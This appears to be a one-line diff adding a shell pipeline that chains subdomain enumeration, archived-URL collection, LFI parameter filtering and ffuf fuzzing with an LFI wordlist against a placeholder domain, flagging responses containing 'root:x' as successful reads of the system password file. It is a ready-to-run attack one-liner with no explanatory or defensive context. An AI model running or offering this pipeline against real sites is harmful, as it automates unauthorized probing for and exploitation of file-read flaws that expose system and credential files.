@@ -1,0 +1,1 @@
+findomain -t example.com -q | waybackurls |gf lfi |qsreplace FUZZ |while read url; do ffuf -u $url -mr "root:x" -w ~/wordlist/LFI.txt; done
